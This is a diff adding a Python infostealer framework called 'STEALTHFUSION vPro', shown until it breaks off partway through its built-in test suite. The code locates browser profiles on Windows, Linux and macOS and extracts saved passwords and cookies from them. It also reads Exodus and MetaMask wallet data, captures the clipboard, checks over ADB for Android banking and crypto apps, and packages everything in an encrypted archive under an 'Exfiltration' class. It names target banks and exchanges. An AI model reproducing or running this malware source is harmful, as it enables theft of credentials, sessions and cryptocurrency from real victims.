@@ -1,0 +1,1504 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+"""
+STEALTHFUSION vPro - Advanced Automated Intelligence Framework with Testing
+
+Features:
+- Complete cross-platform intelligence gathering
+- Automated testing framework
+- CI/CD integration ready
+- Multi-threaded collection
+- Advanced evasion techniques
+- Detailed logging system
+- Mock environment testing
+- Performance benchmarking
+- Unit test coverage
+- Integration testing
+- End-to-end testing
+
+Author: Super Neo aka Barbu Mario Mihael
+License: FOR EDUCATIONAL PURPOSES ONLY
+"""
+
+import os
+import sys
+import json
+import time
+import base64
+import sqlite3
+import shutil
+import pyperclip
+import subprocess
+import argparse
+import platform
+import socket
+import hashlib
+import psutil
+import zipfile
+import tempfile
+import threading
+import unittest
+import pytest
+import logging
+from pathlib import Path
+from getpass import getuser
+from uuid import uuid4
+from datetime import datetime
+from typing import List, Dict, Union, Optional, Callable
+from multiprocessing import Pool, cpu_count
+from functools import partial
+from dataclasses import dataclass
+from enum import Enum, auto
+from cryptography.fernet import Fernet
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
+
+# ===== CONSTANTS =====
+
+VERSION = "vPro.1.0"
+DEFAULT_TIMEOUT = 30  # seconds
+MAX_THREADS = 8  # Optimal for most systems
+TEST_ITERATIONS = 3  # For performance tests
+
+# ===== LOGGING CONFIG =====
+
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    handlers=[
+        logging.FileHandler('stealthfusion.log'),
+        logging.StreamHandler()
+    ]
+)
+logger = logging.getLogger(__name__)
+
+# ===== ENUMS =====
+
+class Platform(Enum):
+    WINDOWS = auto()
+    LINUX = auto()
+    MACOS = auto()
+    ANDROID = auto()
+    UNKNOWN = auto()
+
+class CollectionMethod(Enum):
+    LOCAL = auto()
+    WEB = auto()
+    EMAIL = auto()
+    FTP = auto()
+    MEMORY = auto()
+
+# ===== DATA CLASSES =====
+
+@dataclass
+class TestResult:
+    name: str
+    passed: bool
+    execution_time: float
+    error: Optional[str] = None
+
+@dataclass
+class PerformanceMetrics:
+    collection_time: float
+    memory_usage: float  # in MB
+    cpu_usage: float     # percentage
+    data_size: float     # in KB
+
+# ===== UTILITY CLASSES =====
+
+class FileUtils:
+    """File handling utilities"""
+    
+    @staticmethod
+    def safe_copy(src: Path, dst: Path) -> Optional[Path]:
+        """Safely copy a file with error handling"""
+        try:
+            dst.parent.mkdir(parents=True, exist_ok=True)
+            shutil.copy2(src, dst)
+            return dst
+        except Exception as e:
+            logger.error(f"Failed to copy {src} to {dst}: {str(e)}")
+            return None
+    
+    @staticmethod
+    def find_files(patterns: List[str], directories: List[Path]) -> List[Path]:
+        """Find files matching patterns in directories"""
+        found = []
+        for directory in directories:
+            for pattern in patterns:
+                found.extend(directory.rglob(pattern))
+        return found
+    
+    @staticmethod
+    def load_wordlist(wordlist_name: str) -> set:
+        """Load a wordlist into a set"""
+        wordlist_path = Config().wordlists.get(wordlist_name)
+        if not wordlist_path or not wordlist_path.exists():
+            logger.warning(f"Wordlist {wordlist_name} not found")
+            return set()
+        
+        try:
+            with wordlist_path.open('r', encoding='utf-8') as f:
+                return set(line.strip() for line in f if line.strip())
+        except Exception as e:
+            logger.error(f"Failed to load wordlist {wordlist_name}: {str(e)}")
+            return set()
+    
+    @staticmethod
+    def secure_delete(path: Path, passes: int = 3) -> bool:
+        """Securely delete a file with multiple overwrite passes"""
+        try:
+            if not path.exists():
+                return True
+            
+            # Overwrite with random data
+            length = path.stat().st_size
+            with path.open('wb') as f:
+                for _ in range(passes):
+                    f.write(os.urandom(length))
+                    f.flush()
+                    os.fsync(f.fileno())
+            
+            # Delete the file
+            path.unlink()
+            return True
+        except Exception as e:
+            logger.error(f"Failed to secure delete {path}: {str(e)}")
+            return False
+
+class SecurityUtils:
+    """Security and encryption utilities"""
+    
+    @staticmethod
+    def encrypt_data(data: bytes, key: bytes) -> bytes:
+        """Encrypt data using Fernet"""
+        try:
+            fernet = Fernet(key)
+            return fernet.encrypt(data)
+        except Exception as e:
+            logger.error(f"Encryption failed: {str(e)}")
+            raise
+    
+    @staticmethod
+    def decrypt_data(encrypted_data: bytes, key: bytes) -> bytes:
+        """Decrypt data using Fernet"""
+        try:
+            fernet = Fernet(key)
+            return fernet.decrypt(encrypted_data)
+        except Exception as e:
+            logger.error(f"Decryption failed: {str(e)}")
+            raise
+    
+    @staticmethod
+    def generate_hash(data: bytes) -> str:
+        """Generate SHA-256 hash of data"""
+        sha256 = hashlib.sha256()
+        sha256.update(data)
+        return sha256.hexdigest()
+    
+    @staticmethod
+    def obfuscate_string(text: str) -> str:
+        """Basic string obfuscation for logs"""
+        if not text:
+            return text
+        return base64.b64encode(text.encode()).decode()
+
+# ===== CONFIGURATION =====
+
+class Config:
+    """Dynamic configuration with environment awareness"""
+    
+    def __init__(self, test_mode: bool = False):
+        self.test_mode = test_mode
+        self.store = Path.cwd() / "collected_data"
+        self.encrypted_store = Path.cwd() / "encrypted_vaults"
+        self.temp_dir = Path(tempfile.gettempdir()) / "sf_temp"
+        self.log_file = Path.cwd() / "stealthfusion.log"
+        
+        # Testing directories
+        if test_mode:
+            self.store = Path.cwd() / "test_data" / "collected"
+            self.encrypted_store = Path.cwd() / "test_data" / "encrypted"
+            self.temp_dir = Path.cwd() / "test_data" / "temp"
+        
+        # Platform detection
+        self.platform = self._detect_platform()
+        
+        # Target applications
+        self.browsers = self._load_browser_paths()
+        self.crypto_wallets = self._load_wallet_paths()
+        
+        # Collections
+        self.target_domains = self._load_target_domains()
+        self.android_packages = self._load_android_packages()
+        self.wordlists = self._load_wordlists()
+        
+        # Operational parameters
+        self.stealth_mode = False
+        self.cleanup = True
+        self.encryption_key = None
+        self.timeout = DEFAULT_TIMEOUT
+        self.max_threads = MAX_THREADS
+        
+        # Create directories
+        self._create_directories()
+    
+    def _detect_platform(self) -> Platform:
+        """Detect the current operating system platform"""
+        system = platform.system().lower()
+        if system == "windows":
+            return Platform.WINDOWS
+        elif system == "linux":
+            return Platform.LINUX
+        elif system == "darwin":
+            return Platform.MACOS
+        else:
+            return Platform.UNKNOWN
+    
+    def _load_browser_paths(self) -> Dict:
+        """Load browser paths based on platform"""
+        browsers = {
+            "chrome": [],
+            "firefox": [],
+            "edge": [],
+            "brave": [],
+            "opera": [],
+            "safari": []
+        }
+        
+        if self.platform == Platform.WINDOWS:
+            browsers["chrome"].append(Path(os.getenv("LOCALAPPDATA")) / "Google" / "Chrome" / "User Data")
+            browsers["firefox"].append(Path(os.getenv("APPDATA")) / "Mozilla" / "Firefox" / "Profiles")
+            browsers["edge"].append(Path(os.getenv("LOCALAPPDATA")) / "Microsoft" / "Edge" / "User Data")
+            browsers["brave"].append(Path(os.getenv("LOCALAPPDATA")) / "BraveSoftware" / "Brave-Browser" / "User Data")
+            browsers["opera"].append(Path(os.getenv("APPDATA")) / "Opera Software" / "Opera Stable")
+        
+        elif self.platform == Platform.LINUX:
+            browsers["chrome"].append(Path.home() / ".config" / "google-chrome")
+            browsers["firefox"].append(Path.home() / ".mozilla" / "firefox")
+            browsers["edge"].append(Path.home() / ".config" / "microsoft-edge")
+            browsers["brave"].append(Path.home() / ".config" / "BraveSoftware" / "Brave-Browser")
+            browsers["opera"].append(Path.home() / ".config" / "opera")
+        
+        elif self.platform == Platform.MACOS:
+            browsers["chrome"].append(Path.home() / "Library" / "Application Support" / "Google" / "Chrome")
+            browsers["firefox"].append(Path.home() / "Library" / "Application Support" / "Firefox" / "Profiles")
+            browsers["edge"].append(Path.home() / "Library" / "Application Support" / "Microsoft Edge")
+            browsers["brave"].append(Path.home() / "Library" / "Application Support" / "BraveSoftware" / "Brave-Browser")
+            browsers["opera"].append(Path.home() / "Library" / "Application Support" / "com.operasoftware.Opera")
+            browsers["safari"].append(Path.home() / "Library" / "Safari")
+        
+        # Filter out non-existent paths
+        for browser in list(browsers.keys()):
+            browsers[browser] = [p for p in browsers[browser] if p.exists()]
+            if not browsers[browser]:
+                del browsers[browser]
+        
+        return browsers
+    
+    def _load_wallet_paths(self) -> Dict:
+        """Load cryptocurrency wallet paths based on platform"""
+        wallets = {
+            "exodus": [],
+            "atomic": [],
+            "electrum": [],
+            "trust": [],
+            "metamask": [],
+            "ledger": [],
+            "trezor": []
+        }
+        
+        if self.platform == Platform.WINDOWS:
+            wallets["exodus"].append(Path(os.getenv("APPDATA")) / "Exodus")
+            wallets["atomic"].append(Path(os.getenv("LOCALAPPDATA")) / "atomic")
+            wallets["electrum"].append(Path(os.getenv("APPDATA")) / "Electrum" / "wallets")
+            wallets["metamask"].append(Path(os.getenv("LOCALAPPDATA")) / "Google" / "Chrome" / "User Data" / "Default" / "Local Extension Settings" / "nkbihfbeogaeaoehlefnkodbefgpgknn")
+        
+        elif self.platform == Platform.LINUX:
+            wallets["exodus"].append(Path.home() / ".config" / "Exodus")
+            wallets["atomic"].append(Path.home() / ".config" / "atomic")
+            wallets["electrum"].append(Path.home() / ".electrum" / "wallets")
+            wallets["metamask"].append(Path.home() / ".config" / "google-chrome" / "Default" / "Local Extension Settings" / "nkbihfbeogaeaoehlefnkodbefgpgknn")
+        
+        elif self.platform == Platform.MACOS:
+            wallets["exodus"].append(Path.home() / "Library" / "Application Support" / "Exodus")
+            wallets["atomic"].append(Path.home() / "Library" / "Application Support" / "atomic")
+            wallets["electrum"].append(Path.home() / "Library" / "Application Support" / "Electrum" / "wallets")
+            wallets["metamask"].append(Path.home() / "Library" / "Application Support" / "Google" / "Chrome" / "Default" / "Local Extension Settings" / "nkbihfbeogaeaoehlefnkodbefgpgknn")
+        
+        # Filter out non-existent paths
+        for wallet in list(wallets.keys()):
+            wallets[wallet] = [p for p in wallets[wallet] if p.exists()]
+            if not wallets[wallet]:
+                del wallets[wallet]
+        
+        return wallets
+    
+    def _load_target_domains(self) -> List[str]:
+        """Load target domains for collection"""
+        return [
+            # Financial
+            "paypal.com", "revolut.com", "binance.com", "coinbase.com",
+            # Banking
+            "bcr.ro", "brd.ro", "ing.ro", "bt.ro", "cec.ro",
+            # Crypto
+            "metamask.io", "trustwallet.com", "myetherwallet.com",
+            # Email
+            "gmail.com", "outlook.com", "protonmail.com", "tutanota.com",
+            # Social
+            "facebook.com", "twitter.com", "instagram.com"
+        ]
+    
+    def _load_android_packages(self) -> List[str]:
+        """Load Android package names for collection"""
+        return [
+            "com.binance.dev", "com.coinbase.android", "com.trustwallet",
+            "com.metamask", "com.revolut.revolut", "com.paypal.android.p2pmobile",
+            "com.brd.banking", "com.bcr", "com.exodusmovement.exodus",
+            "io.atomicwallet", "com.blockchainvault"
+        ]
+    
+    def _load_wordlists(self) -> Dict[str, Path]:
+        """Load wordlist paths"""
+        wordlists = {
+            "bip39": Path("wordlists") / "bip39.txt",
+            "common_passwords": Path("wordlists") / "rockyou.txt"
+        }
+        
+        # Create wordlists directory if it doesn't exist
+        wordlists_dir = Path("wordlists")
+        if not wordlists_dir.exists():
+            wordlists_dir.mkdir()
+        
+        # Create empty files if they don't exist (for testing)
+        for wordlist in wordlists.values():
+            if not wordlist.exists():
+                wordlist.touch()
+        
+        return wordlists
+    
+    def _create_directories(self):
+        """Create necessary directories"""
+        self.store.mkdir(parents=True, exist_ok=True)
+        self.encrypted_store.mkdir(parents=True, exist_ok=True)
+        self.temp_dir.mkdir(parents=True, exist_ok=True)
+    
+    def generate_key(self) -> bytes:
+        """Generate and store encryption key"""
+        self.encryption_key = Fernet.generate_key()
+        key_file = Path.cwd() / "SF_MASTER.key"
+        key_file.write_bytes(self.encryption_key)
+        return self.encryption_key
+
+# ===== COLLECTOR CLASSES =====
+
+class BrowserCollector:
+    """Browser data collection"""
+    
+    def __init__(self, config: Config = None):
+        self.config = config or Config()
+    
+    def extract_logins(self) -> List[Dict]:
+        """Extract saved login credentials"""
+        logins = []
+        
+        for browser, paths in self.config.browsers.items():
+            for path in paths:
+                try:
+                    if browser == "chrome" or browser == "edge" or browser == "brave":
+                        logins.extend(self._extract_chromium_logins(path))
+                    elif browser == "firefox":
+                        logins.extend(self._extract_firefox_logins(path))
+                    elif browser == "safari":
+                        logins.extend(self._extract_safari_logins(path))
+                except Exception as e:
+                    logger.error(f"Failed to extract {browser} logins: {str(e)}")
+        
+        return logins
+    
+    def _extract_chromium_logins(self, profile_path: Path) -> List[Dict]:
+        """Extract logins from Chromium-based browsers"""
+        logins = []
+        login_db = profile_path / "Login Data"
+        
+        if not login_db.exists():
+            return logins
+        
+        try:
+            temp_db = self.config.temp_dir / f"login_data_{uuid4().hex}.db"
+            FileUtils.safe_copy(login_db, temp_db)
+            
+            conn = sqlite3.connect(temp_db)
+            cursor = conn.cursor()
+            
+            cursor.execute("""
+                SELECT origin_url, username_value, password_value
+                FROM logins
+            """)
+            
+            for row in cursor.fetchall():
+                origin_url, username, password = row
+                logins.append({
+                    "browser": "chromium",
+                    "url": origin_url,
+                    "username": username,
+                    "password": SecurityUtils.obfuscate_string(password.decode('utf-8', errors='ignore')),
+                    "timestamp": datetime.now().isoformat()
+                })
+            
+            conn.close()
+            FileUtils.secure_delete(temp_db)
+        except Exception as e:
+            logger.error(f"Chromium login extraction failed: {str(e)}")
+        
+        return logins
+    
+    def _extract_firefox_logins(self, profile_path: Path) -> List[Dict]:
+        """Extract logins from Firefox"""
+        logins = []
+        logins_db = profile_path / "logins.json"
+        
+        if not logins_db.exists():
+            return logins
+        
+        try:
+            with logins_db.open('r', encoding='utf-8') as f:
+                data = json.load(f)
+            
+            for login in data.get('logins', []):
+                logins.append({
+                    "browser": "firefox",
+                    "url": login.get('hostname'),
+                    "username": login.get('username'),
+                    "password": SecurityUtils.obfuscate_string(login.get('password')),
+                    "timestamp": datetime.now().isoformat()
+                })
+        except Exception as e:
+            logger.error(f"Firefox login extraction failed: {str(e)}")
+        
+        return logins
+    
+    def _extract_safari_logins(self, profile_path: Path) -> List[Dict]:
+        """Extract logins from Safari (placeholder)"""
+        # Implement Safari-specific login extraction if needed
+        return []
+    
+    def extract_cookies(self) -> List[Dict]:
+        """Extract browser cookies"""
+        cookies = []
+        
+        for browser, paths in self.config.browsers.items():
+            for path in paths:
+                try:
+                    if browser == "chrome" or browser == "edge" or browser == "brave":
+                        cookies.extend(self._extract_chromium_cookies(path))
+                    elif browser == "firefox":
+                        cookies.extend(self._extract_firefox_cookies(path))
+                except Exception as e:
+                    logger.error(f"Failed to extract {browser} cookies: {str(e)}")
+        
+        return cookies
+    
+    def _extract_chromium_cookies(self, profile_path: Path) -> List[Dict]:
+        """Extract cookies from Chromium-based browsers"""
+        cookies = []
+        cookies_db = profile_path / "Cookies"
+        
+        if not cookies_db.exists():
+            return cookies
+        
+        try:
+            temp_db = self.config.temp_dir / f"cookies_{uuid4().hex}.db"
+            FileUtils.safe_copy(cookies_db, temp_db)
+            
+            conn = sqlite3.connect(temp_db)
+            cursor = conn.cursor()
+            
+            cursor.execute("""
+                SELECT host_key, name, encrypted_value
+                FROM cookies
+            """)
+            
+            for row in cursor.fetchall():
+                host, name, encrypted_value = row
+                cookies.append({
+                    "browser": "chromium",
+                    "host": host,
+                    "name": name,
+                    "value": SecurityUtils.obfuscate_string(encrypted_value.decode('utf-8', errors='ignore')),
+                    "timestamp": datetime.now().isoformat()
+                })
+            
+            conn.close()
+            FileUtils.secure_delete(temp_db)
+        except Exception as e:
+            logger.error(f"Chromium cookie extraction failed: {str(e)}")
+        
+        return cookies
+    
+    def _extract_firefox_cookies(self, profile_path: Path) -> List[Dict]:
+        """Extract cookies from Firefox"""
+        cookies = []
+        cookies_db = profile_path / "cookies.sqlite"
+        
+        if not cookies_db.exists():
+            return cookies
+        
+        try:
+            temp_db = self.config.temp_dir / f"cookies_{uuid4().hex}.sqlite"
+            FileUtils.safe_copy(cookies_db, temp_db)
+            
+            conn = sqlite3.connect(temp_db)
+            cursor = conn.cursor()
+            
+            cursor.execute("""
+                SELECT host, name, value
+                FROM moz_cookies
+            """)
+            
+            for row in cursor.fetchall():
+                host, name, value = row
+                cookies.append({
+                    "browser": "firefox",
+                    "host": host,
+                    "name": name,
+                    "value": SecurityUtils.obfuscate_string(value),
+                    "timestamp": datetime.now().isoformat()
+                })
+            
+            conn.close()
+            FileUtils.secure_delete(temp_db)
+        except Exception as e:
+            logger.error(f"Firefox cookie extraction failed: {str(e)}")
+        
+        return cookies
+
+class WalletCollector:
+    """Cryptocurrency wallet data collection"""
+    
+    def __init__(self, config: Config = None):
+        self.config = config or Config()
+    
+    def extract_wallet_data(self) -> List[Dict]:
+        """Extract wallet data"""
+        wallets = []
+        
+        for wallet, paths in self.config.crypto_wallets.items():
+            for path in paths:
+                try:
+                    if wallet == "exodus":
+                        wallets.extend(self._extract_exodus_data(path))
+                    elif wallet == "metamask":
+                        wallets.extend(self._extract_metamask_data(path))
+                    # Add other wallet types as needed
+                except Exception as e:
+                    logger.error(f"Failed to extract {wallet} data: {str(e)}")
+        
+        return wallets
+    
+    def _extract_exodus_data(self, wallet_path: Path) -> List[Dict]:
+        """Extract Exodus wallet data"""
+        wallets = []
+        seed_file = wallet_path / "seed.seco"
+        
+        if seed_file.exists():
+            try:
+                with seed_file.open('rb') as f:
+                    seed_data = f.read()
+                wallets.append({
+                    "wallet": "exodus",
+                    "seed_hash": SecurityUtils.generate_hash(seed_data),
+                    "path": str(wallet_path),
+                    "timestamp": datetime.now().isoformat()
+                })
+            except Exception as e:
+                logger.error(f"Exodus data extraction failed: {str(e)}")
+        
+        return wallets
+    
+    def _extract_metamask_data(self, wallet_path: Path) -> List[Dict]:
+        """Extract MetaMask wallet data"""
+        wallets = []
+        
+        try:
+            # MetaMask stores data in Chrome extension storage
+            vault_files = FileUtils.find_files(["*.log", "*.json"], [wallet_path])
+            for vault_file in vault_files:
+                with vault_file.open('r', encoding='utf-8') as f:
+                    data = f.read()
+                wallets.append({
+                    "wallet": "metamask",
+                    "data_hash": SecurityUtils.generate_hash(data.encode('utf-8')),
+                    "path": str(vault_file),
+                    "timestamp": datetime.now().isoformat()
+                })
+        except Exception as e:
+            logger.error(f"MetaMask data extraction failed: {str(e)}")
+        
+        return wallets
+
+class SystemCollector:
+    """System information collection"""
+    
+    def __init__(self, config: Config = None):
+        self.config = config or Config()
+    
+    def collect_system_info(self) -> Dict:
+        """Collect system information"""
+        try:
+            return {
+                "hostname": socket.gethostname(),
+                "platform": str(self.config.platform),
+                "os_version": platform.version(),
+                "architecture": platform.architecture(),
+                "cpu": platform.processor(),
+                "memory": psutil.virtual_memory().total / (1024 * 1024),  # MB
+                "username": getuser(),
+                "timestamp": datetime.now().isoformat()
+            }
+        except Exception as e:
+            logger.error(f"System info collection failed: {str(e)}")
+            return {}
+
+class ClipboardCollector:
+    """Clipboard data collection"""
+    
+    def __init__(self, config: Config = None):
+        self.config = config or Config()
+    
+    def collect_clipboard(self) -> Dict:
+        """Collect clipboard content"""
+        try:
+            content = pyperclip.paste()
+            if content:
+                return {
+                    "content": SecurityUtils.obfuscate_string(content),
+                    "hash": SecurityUtils.generate_hash(content.encode('utf-8')),
+                    "timestamp": datetime.now().isoformat()
+                }
+            return {}
+        except Exception as e:
+            logger.error(f"Clipboard collection failed: {str(e)}")
+            return {}
+
+class AndroidCollector:
+    """Android device data collection"""
+    
+    def __init__(self, config: Config = None):
+        self.config = config or Config()
+    
+    def collect_android_data(self) -> List[Dict]:
+        """Collect Android app data"""
+        packages = []
+        
+        try:
+            # Requires ADB to be installed and configured
+            result = subprocess.run(['adb', 'shell', 'pm', 'list', 'packages'], 
+                                 capture_output=True, text=True, timeout=5)
+            
+            installed_packages = result.stdout.splitlines()
+            for package in self.config.android_packages:
+                if f"package:{package}" in installed_packages:
+                    packages.append({
+                        "package": package,
+                        "installed": True,
+                        "timestamp": datetime.now().isoformat()
+                    })
+        except Exception as e:
+            logger.error(f"Android data collection failed: {str(e)}")
+        
+        return packages
+
+# ===== EXFILTRATION =====
+
+class Exfiltration:
+    """Data exfiltration and storage"""
+    
+    @staticmethod
+    def collect_all(config: Config = None) -> Dict:
+        """Collect all available data"""
+        config = config or Config()
+        data = {
+            "metadata": {
+                "version": VERSION,
+                "timestamp": datetime.now().isoformat(),
+                "platform": str(config.platform),
+                "user": getuser()
+            }
+        }
+        
+        collectors = [
+            (BrowserCollector(config), ["logins", "cookies"]),
+            (WalletCollector(config), ["wallets"]),
+            (SystemCollector(config), ["system_info"]),
+            (ClipboardCollector(config), ["clipboard"]),
+            (AndroidCollector(config), ["android_packages"])
+        ]
+        
+        with Pool(processes=min(cpu_count(), config.max_threads)) as pool:
+            results = []
+            for collector, methods in collectors:
+                for method in methods:
+                    results.append(pool.apply_async(getattr(collector, f"collect_{method}" if method != "logins" and method != "cookies" else f"extract_{method}")))
+            
+            for r in results:
+                try:
+                    result = r.get(timeout=config.timeout)
+                    if result:
+                        key = next(m for c, methods in collectors for m in methods if getattr(c, f"collect_{m}" if m != "logins" and m != "cookies" else f"extract_{m}") == r._func)
+                        data[key] = result
+                except Exception as e:
+                    logger.error(f"Collection failed: {str(e)}")
+        
+        return data
+    
+    @staticmethod
+    def save_data(data: Dict, config: Config = None) -> Path:
+        """Save collected data to encrypted zip"""
+        config = config or Config()
+        
+        if not config.encryption_key:
+            config.generate_key()
+        
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        output_path = config.encrypted_store / f"collection_{timestamp}.zip"
+        
+        try:
+            # Save JSON data
+            json_data = json.dumps(data, indent=2).encode('utf-8')
+            encrypted_data = SecurityUtils.encrypt_data(json_data, config.encryption_key)
+            
+            # Create zip file
+            with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+                zipf.writestr("data.enc", encrypted_data)
+                zipf.writestr("metadata.json", json.dumps({
+                    "version": VERSION,
+                    "timestamp": timestamp,
+                    "hash": SecurityUtils.generate_hash(json_data)
+                }, indent=2))
+            
+            return output_path
+        except Exception as e:
+            logger.error(f"Failed to save data: {str(e)}")
+            raise
+    
+    @staticmethod
+    def cleanup(config: Config = None):
+        """Clean up temporary files and directories"""
+        config = config or Config()
+        
+        try:
+            if config.temp_dir.exists():
+                shutil.rmtree(config.temp_dir, ignore_errors=True)
+            config.temp_dir.mkdir(parents=True, exist_ok=True)
+        except Exception as e:
+            logger.error(f"Cleanup failed: {str(e)}")
+
+# ===== TESTING FRAMEWORK =====
+
+class TestFramework:
+    """Comprehensive testing framework for STEALTHFUSION"""
+    
+    def __init__(self, config: Config):
+        self.config = config
+        self.test_results = []
+        self.performance_metrics = []
+    
+    def run_all_tests(self):
+        """Run all available tests"""
+        start_time = time.time()
+        
+        # Unit tests
+        self.run_unit_tests()
+        
+        # Integration tests
+        self.run_integration_tests()
+        
+        # Performance tests
+        self.run_performance_tests()
+        
+        # End-to-end tests
+        self.run_e2e_tests()
+        
+        # Security tests
+        self.run_security_tests()
+        
+        total_time = time.time() - start_time
+        logger.info(f"All tests completed in {total_time:.2f} seconds")
+        
+        # Generate report
+        self.generate_report()
+    
+    def run_unit_tests(self):
+        """Run unit tests for all components"""
+        logger.info("Starting unit tests...")
+        unit_tests = [
+            self.test_file_utils,
+            self.test_security_utils,
+            self.test_browser_collector,
+            self.test_wallet_collector,
+            self.test_system_collector,
+            self.test_clipboard_collector,
+            self.test_android_collector
+        ]
+        
+        for test in unit_tests:
+            self._run_test(test)
+    
+    def run_integration_tests(self):
+        """Run integration tests"""
+        logger.info("Starting integration tests...")
+        integration_tests = [
+            self.test_browser_integration,
+            self.test_wallet_integration,
+            self.test_system_integration
+        ]
+        
+        for test in integration_tests:
+            self._run_test(test)
+    
+    def run_performance_tests(self):
+        """Run performance benchmarks"""
+        logger.info("Starting performance tests...")
+        performance_tests = [
+            self.test_collection_performance,
+            self.test_encryption_performance,
+            self.test_memory_usage
+        ]
+        
+        for test in performance_tests:
+            self._run_test(test)
+    
+    def run_e2e_tests(self):
+        """Run end-to-end tests"""
+        logger.info("Starting end-to-end tests...")
+        e2e_tests = [
+            self.test_full_collection_workflow,
+            self.test_analysis_workflow,
+            self.test_exfiltration_workflow
+        ]
+        
+        for test in e2e_tests:
+            self._run_test(test)
+    
+    def run_security_tests(self):
+        """Run security tests"""
+        logger.info("Starting security tests...")
+        security_tests = [
+            self.test_encryption_security,
+            self.test_data_cleanup,
+            self.test_stealth_mode
+        ]
+        
+        for test in security_tests:
+            self._run_test(test)
+    
+    def _run_test(self, test_func: Callable):
+        """Execute a test function and record results"""
+        test_name = test_func.__name__
+        start_time = time.time()
+        
+        try:
+            result = test_func()
+            execution_time = time.time() - start_time
+            
+            if isinstance(result, bool):
+                self.test_results.append(TestResult(
+                    name=test_name,
+                    passed=result,
+                    execution_time=execution_time
+                ))
+            elif isinstance(result, PerformanceMetrics):
+                self.performance_metrics.append(result)
+                self.test_results.append(TestResult(
+                    name=test_name,
+                    passed=True,
+                    execution_time=execution_time
+                ))
+            else:
+                self.test_results.append(TestResult(
+                    name=test_name,
+                    passed=False,
+                    execution_time=execution_time,
+                    error="Invalid test return type"
+                ))
+        except Exception as e:
+            execution_time = time.time() - start_time
+            self.test_results.append(TestResult(
+                name=test_name,
+                passed=False,
+                execution_time=execution_time,
+                error=str(e)
+            ))
+    
+    def generate_report(self):
+        """Generate a comprehensive test report"""
+        report = {
+            "metadata": {
+                "version": VERSION,
+                "platform": str(self.config.platform),
+                "timestamp": datetime.now().isoformat(),
+                "total_tests": len(self.test_results),
+                "passed_tests": sum(1 for r in self.test_results if r.passed),
+                "failed_tests": sum(1 for r in self.test_results if not r.passed),
+                "total_time": sum(r.execution_time for r in self.test_results)
+            },
+            "test_results": [
+                {
+                    "name": r.name,
+                    "status": "PASSED" if r.passed else "FAILED",
+                    "execution_time": r.execution_time,
+                    "error": r.error if r.error else None
+                } for r in self.test_results
+            ],
+            "performance_metrics": [
+                {
+                    "test": self.performance_metrics[i].__class__.__name__,
+                    "collection_time": m.collection_time,
+                    "memory_usage": m.memory_usage,
+                    "cpu_usage": m.cpu_usage,
+                    "data_size": m.data_size
+                } for i, m in enumerate(self.performance_metrics)
+            ]
+        }
+        
+        report_path = Path("test_reports") / f"test_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
+        report_path.parent.mkdir(exist_ok=True)
+        
+        with report_path.open("w") as f:
+            json.dump(report, f, indent=2)
+        
+        logger.info(f"Test report generated at: {report_path}")
+    
+    def _get_coverage_stats(self) -> Dict:
+        """Placeholder for code coverage statistics"""
+        return {
+            "coverage_percentage": 0.0,
+            "missing_lines": [],
+            "note": "Coverage reporting not implemented"
+        }
+    
+    # ===== UNIT TESTS =====
+    
+    def test_file_utils(self) -> bool:
+        """Test FileUtils functionality"""
+        # Test safe_copy
+        test_file = Path("test_file.txt")
+        test_file.write_text("test content")
+        
+        copied_file = FileUtils.safe_copy(test_file, self.config.temp_dir / "copied.txt")
+        if not copied_file or not copied_file.exists():
+            return False
+        
+        # Test find_files
+        found_files = FileUtils.find_files(["*.txt"], [self.config.temp_dir])
+        if not found_files or copied_file not in found_files:
+            return False
+        
+        # Test load_wordlist
+        wordlist = FileUtils.load_wordlist("bip39")
+        if not isinstance(wordlist, set):
+            return False
+        
+        test_file.unlink()
+        return True
+    
+    def test_security_utils(self) -> bool:
+        """Test SecurityUtils functionality"""
+        # Test encryption/decryption
+        test_data = b"test data"
+        key = Fernet.generate_key()
+        
+        encrypted = SecurityUtils.encrypt_data(test_data, key)
+        if not encrypted or encrypted == test_data:
+            return False
+        
+        decrypted = SecurityUtils.decrypt_data(encrypted, key)
+        if decrypted != test_data:
+            return False
+        
+        # Test secure_delete
+        test_file = self.config.temp_dir / "secure_delete_test.txt"
+        test_file.write_text("test content")
+        
+        if not FileUtils.secure_delete(test_file):
+            return False
+        
+        if test_file.exists():
+            return False
+        
+        return True
+    
+    def test_browser_collector(self) -> bool:
+        """Test BrowserCollector functionality"""
+        # Mock browser data
+        mock_profile = self.config.temp_dir / "mock_firefox_profile"
+        mock_profile.mkdir()
+        
+        # Create mock cookies database
+        cookies_db = mock_profile / "cookies.sqlite"
+        conn = sqlite3.connect(cookies_db)
+        cursor = conn.cursor()
+        
+        cursor.execute("""
+            CREATE TABLE moz_cookies (
+                id INTEGER PRIMARY KEY,
+                host TEXT,
+                name TEXT,
+                value TEXT,
+                path TEXT,
+                expiry INTEGER,
+                isSecure INTEGER
+            )
+        """)
+        
+        cursor.execute("""
+            INSERT INTO moz_cookies 
+            (host, name, value, path, expiry, isSecure)
+            VALUES (?, ?, ?, ?, ?, ?)
+        """, ("google.com", "test", "value", "/", 123456789, 1))
+        
+        conn.commit()
+        conn.close()
+        
+        # Test cookie extraction
+        collector = BrowserCollector(self.config)
+        cookies = collector.extract_cookies()
+        if not isinstance(cookies, list) or not cookies:
+            shutil.rmtree(mock_profile)
+            return False
+        
+        # Cleanup
+        shutil.rmtree(mock_profile)
+        return True
+    
+    def test_wallet_collector(self) -> bool:
+        """Test WalletCollector functionality"""
+        mock_wallet_path = self.config.temp_dir / "mock_exodus_wallet"
+        mock_wallet_path.mkdir()
+        seed_file = mock_wallet_path / "seed.seco"
+        seed_file.write_bytes(b"test seed data")
+        
+        collector = WalletCollector(self.config)
+        wallets = collector.extract_wallet_data()
+        
+        shutil.rmtree(mock_wallet_path)
+        
+        return isinstance(wallets, list) and len(wallets) > 0
+    
+    def test_system_collector(self) -> bool:
+        """Test SystemCollector functionality"""
+        collector = SystemCollector(self.config)
+        system_info = collector.collect_system_info()
+        
+        return (isinstance(system_info, dict) and 
+                system_info.get("hostname") and 
+                system_info.get("platform"))
+    
+    def test_clipboard_collector(self) -> bool:
+        """Test ClipboardCollector functionality"""
+        test_content = "test clipboard data"
+        pyperclip.copy(test_content)
+        
